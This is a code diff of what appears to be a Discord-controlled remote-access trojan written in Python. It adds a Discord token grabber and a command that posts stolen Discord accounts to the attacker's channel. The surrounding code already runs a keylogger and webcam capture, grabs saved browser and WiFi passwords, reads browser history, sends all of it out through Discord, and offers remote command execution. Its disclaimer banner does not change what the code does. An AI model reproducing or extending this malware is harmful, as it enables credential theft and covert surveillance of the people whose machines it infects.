@@ -1,4 +1,5 @@
 from cv2 import VideoCapture, imwrite, CAP_DSHOW
+from resources.discord_token_grabber import *
 from pynput.keyboard import Key, Listener
 from resources.passwords_grabber import *
 from browser_history import get_history
@@ -23,10 +24,9 @@ import discord
 import pyaudio
 import asyncio
 import winreg
-import struct
-import time
 import sys
 import os
+
 ###############################################################################
 ##                                                                           ##
 ##   DISCLAIMER !!! READ BEFORE USING                                        ##
@@ -66,15 +66,12 @@ guild_id = None
 # - you know exacly what are you doing - #
 # -------------------------------------- #
 
-    
-
-
 client = discord.Client(intents=discord.Intents.all())
 
 bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
 
-#discord.opus.load_opus(opuslib_path)
+discord.opus.load_opus(opuslib_path)
     
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
@@ -563,7 +560,7 @@ async def on_message(message):
                         embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                         for url in result.keys():
                             embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
-                        await message.channel.send(embed=embed)
+                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                         
                     elif message.content[6:] == 'history':
                         with open('history.txt', 'w') as history:
@@ -606,9 +603,12 @@ async def on_message(message):
                         embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
                         for network in result.keys():
                             embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
+                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
 
-                        await message.channel.send(embed=embed)
-
+                    elif message.content[6:] == 'discord':
+                        accounts = grab_discord.initialize()
+                        for account in accounts:
+                            reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
 
             elif message.content[:8] == '.execute':
                 await message.delete()
